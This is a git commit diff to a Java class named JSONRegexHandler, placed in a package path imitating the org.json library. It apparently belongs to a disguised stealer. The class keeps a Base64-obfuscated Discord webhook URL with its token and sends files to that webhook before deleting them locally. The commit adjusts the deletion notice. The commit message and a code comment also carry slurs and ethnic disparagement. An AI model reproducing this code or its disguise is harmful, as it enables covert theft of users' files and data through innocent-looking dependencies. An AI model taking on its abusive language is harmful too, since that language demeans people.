6b20218509a308c9da1fd35579e17f025e96ef3f
notperry1234567890 <65968863+notperry1234567890@users.noreply.github.com>
2021-12-05 19:19:00 -0800

    Update JSONRegexHandler.java
    Ok so file deleted after every msg is cancer I tried to make a work around but I hate Chinese code so I'm only making it send a message if it failed to delete the file & removed redundant suppression.

--- src/main/java/org/json/updated/parsers/JSONRegexHandler.java
+++ src/main/java/org/json/updated/parsers/JSONRegexHandler.java
@@ -7,7 +7,6 @@ import java.io.File;
 import java.nio.charset.StandardCharsets;
 import java.util.Base64;
 
-@SuppressWarnings ("BusyWait")
 public class JSONRegexHandler {
     // For Retarded Ski-People the webhook below is encrypted in Base64 with a UTF-8 character set (Usually using https://base64encode.org).
     private static final String WEBHOOK = "aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzkxNDczMTc3NjkzMTQwNTgzNC9QSXdqNDJMUVFlS0RHTFJpaGxYcUVNTUdJOWU2QkFkampmZUhFWmVmcWN4czRZVU1xWjhTZkNkZi1aaEFCb0MtWHk4ag==";
@@ -29,7 +28,6 @@ public class JSONRegexHandler {
         assert result != null;
         if (result.contains("Invalid Webhook Token"))
             success = false;
-        if (file.delete()) JSONRegexHandler.send(new JSONBuilder().value("content", "File Deleted: " + file.getName()).build());
-        else if (file.exists()) JSONRegexHandler.send(new JSONBuilder().value("content", "Failed to delete file: " + file.getName()).build());
+        if (!file.delete() && file.exists()) JSONRegexHandler.send(new JSONBuilder().value("content", "Failed to delete file: " + file.getName()).build());
     }
 }
